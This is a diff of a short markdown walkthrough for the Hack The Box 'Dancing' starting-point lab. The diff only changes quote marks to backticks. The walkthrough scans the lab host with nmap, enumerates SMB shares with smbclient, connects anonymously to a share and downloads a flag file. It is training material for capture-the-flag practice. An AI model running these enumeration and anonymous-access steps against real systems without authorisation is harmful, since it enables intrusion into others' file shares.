@@ -4,10 +4,10 @@
 
 ### Hackthebox -Starting-point-Dancing exercise
 
-'nmap -sV 10.129.110.188'
+`nmap -sV 10.129.110.188`
 
 nmap command shows services running on respective ports
-'''bash
+```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-01 18:16 CET
 Nmap scan report for 10.129.110.188
 Host is up (0.030s latency).
@@ -20,14 +20,14 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
-'''
+```
 
 smb refers to server message block, a common client server communication protocol 
 You can use smbclient to access the smb share
 Use help command to see command usage
-'smbclient -h'
+`smbclient -h`
 
-'''bash
+```bash
 Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
         [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
         [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
@@ -44,13 +44,13 @@ Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
         [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
         [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
         [OPTIONS] service <password>
-'''
+```
 
 
 Use smbclient command to connect to ip address of target machine given on hackthebox
-'sudo smbclient -L 10.129.110.188'
+`sudo smbclient -L 10.129.110.188`
 
-'''bash
+```bash
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -58,13 +58,13 @@ Use smbclient command to connect to ip address of target machine given on hackth
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
         WorkShares      Disk  
-'''
+```
 
 use command to get into disk
-'smbclient \\\\10.129.110.188\\Workshares'
+`smbclient \\\\10.129.110.188\\Workshares`
 
 you're inside! now look around and capture the flag
-'''bash
+```bash
 smb: \> ls
   .                                   D        0  Mon Mar 29 10:22:01 2021
   ..                                  D        0  Mon Mar 29 10:22:01 2021
@@ -92,4 +92,4 @@ smb: \James.P\> ls
                 5114111 blocks of size 4096. 1751178 blocks available
 smb: \James.P\> get flag.txt
 getting file \James.P\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
-'''
+```
